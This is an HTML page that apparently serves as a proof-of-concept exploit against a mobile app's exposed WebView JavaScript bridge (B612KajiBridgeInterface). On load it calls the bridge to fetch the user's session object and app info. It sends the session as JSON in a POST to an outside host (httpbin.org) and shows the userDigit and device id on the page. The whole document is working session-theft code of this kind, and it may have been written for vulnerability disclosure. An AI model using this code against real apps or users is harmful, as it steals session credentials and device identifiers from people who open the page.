 <!DOCTYPE html>
  <html>
  <head><title>X</title><meta charset="utf-8"></head>
  <body style="background:#000;color:#0f0;font:12px monospace;padding:10px">
  <div id="s">Loading...</div>
  <script>
  var B = window.B612KajiBridgeInterface;
  var s = document.getElementById('s');

  if (B) {
      s.innerHTML = 'Bridge OK<br>';

      window.c1 = function(d) {
          var x = typeof d === 'string' ? JSON.parse(d) : d;
          s.innerHTML += 'Session captured<br>';

          var xhr = new XMLHttpRequest();
          xhr.open('POST', 'https://httpbin.org/post', true);
          xhr.setRequestHeader('Content-Type', 'application/json');
          xhr.send(JSON.stringify({session: x}));

          s.innerHTML += '<br><b>userDigit:</b><br>';
          s.innerHTML += '<textarea style="width:100%;height:60px;font-size:10px">' + (x.userDigit ||
  'N/A') + '</textarea>';

          s.innerHTML += '<br><b>Full Session JSON:</b><br>';
          s.innerHTML += '<textarea style="width:100%;height:200px;font-size:8px">' + JSON.stringify(x,
  null, 2) + '</textarea>';
      };
      B.getUserSession('c1');

      window.c2 = function(d) {
          var x = typeof d === 'string' ? JSON.parse(d) : x;
          s.innerHTML += '<br><b>duid:</b><br>';
          s.innerHTML += '<textarea style="width:100%;height:30px;font-size:10px">' + (x.duid || 'N/A') +
  '</textarea>';
      };
      B.appInfo('c2');

  } else {
      s.innerHTML = 'No Bridge';
  }
  </script>
  </body>
  </html>
